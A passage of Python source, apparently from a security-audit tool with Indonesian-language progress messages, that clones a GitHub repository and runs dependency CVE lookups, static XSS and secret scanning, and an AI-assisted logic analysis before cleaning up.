        return demo_findings, ["Laravel", "React", "PHP", "MySQL", "Tailwind CSS"], ai_status_warning

    clone_url, owner, repo_name = normalize_github_target(clean_url)
    temp_dir = tempfile.mkdtemp(prefix=f"secaudit_wb_{owner}_{repo_name}_")

    try:
        if progress_callback:
            await progress_callback(
                "WB_INIT", 16,
                f"Menghubungkan ke GitHub & mengklon repositori ({owner}/{repo_name}@{branch})..."
            )

        success = await asyncio.to_thread(_run_git_clone_sync, clone_url, branch, temp_dir)
        if not success:
            if progress_callback:
                await progress_callback(
                    "WB_INIT", 18,
                    f"Fallback: Mengunduh arsip repositori dari GitHub ({owner}/{repo_name}@{branch})..."
                )
            success = await fetch_github_archive_zip(owner, repo_name, branch, temp_dir)

        if not success or not os.path.exists(temp_dir):
            logger.error(f"Gagal mengklon repositori: {clean_url}")
            return findings, tech_stack, AI_FALLBACK_WARNING

        tech_stack = detect_tech_stack_from_dir(temp_dir)
        if progress_callback:
            await progress_callback(
                "WB_INIT", 22,
                f"Kloning Git selesai ({owner}/{repo_name}@{branch}). Stack terdeteksi: {', '.join(tech_stack[:4]) or 'Source Code'}..."
            )

        packages, _ = parse_repo_dependencies(temp_dir)
        if packages:
            cve_res = await query_osv_dev_batch(packages)
            findings.extend(cve_res)

        if progress_callback:
            await progress_callback(
                "WB_SCA_CVE", 38,
                f"Analisis SCA selesai: {len(packages)} dependensi dianalisis terhadap basis data CVE OSV.dev..."
            )

        # 1. SAST Rules, Template XSS & High Entropy Secrets
        sast_secret_findings = scan_sast_and_secrets(temp_dir, entropy_threshold=entropy_threshold, scan_depth=scan_depth)
        findings.extend(sast_secret_findings)

        template_xss_count = len([f for f in sast_secret_findings if f.get("category") == "DOM_XSS"])
        secret_count = len([f for f in sast_secret_findings if f.get("category") in ("JS_SECRET_LEAK", "JS_INFO_EXPOSURE")])

        if progress_callback:
            await progress_callback(
                "WB_AST_XSS", 55,
                f"Audit AST & Blade template selesai ({template_xss_count} potensi ekspresi unescaped XSS)..."
            )
            await progress_callback(
                "WB_SECRETS", 72,
                f"Penambangan rahasia selesai: Shannon Entropy H(X)>={entropy_threshold} ({secret_count} kredensial terdeteksi)..."
            )

        # 2. AI System Logic & Deep Taint Sinks
        logic_files = collect_system_logic_files(temp_dir)
        logic_findings, ai_status_warning = await analyze_system_logic_with_ai(temp_dir, logic_files, scan_depth=scan_depth)

        # Deduplikasi temuan logic
        seen_keys = {(f.get("rule_id"), f.get("location", {}).get("path"), f.get("location", {}).get("line_start")) for f in findings}
        for lf in logic_findings:
            key = (lf.get("rule_id"), lf.get("location", {}).get("path"), lf.get("location", {}).get("line_start"))
            if key not in seen_keys:
                seen_keys.add(key)
                findings.append(lf)

        if progress_callback:
            await progress_callback(
                "WB_TAINT_LOGIC", 86,
                f"Analisis alur taint ({scan_depth}) & logika otorisasi selesai ({len(logic_findings)} temuan logika)..."
            )

        if ai_status_warning:
            for f in findings:
                meta = f.setdefault("evidence_metadata", {})
                if "ai_status" not in meta:
                    meta["ai_status"] = ai_status_warning

    except Exception as e:
        logger.error(f"Terjadi kesalahan saat pemindaian whitebox {clean_url}: {e}", exc_info=True)
        ai_status_warning = AI_FALLBACK_WARNING
    finally:
        try:
            shutil.rmtree(temp_dir, ignore_errors=True)
        except Exception:
            pass

    return findings, tech_stack, ai_status_warning
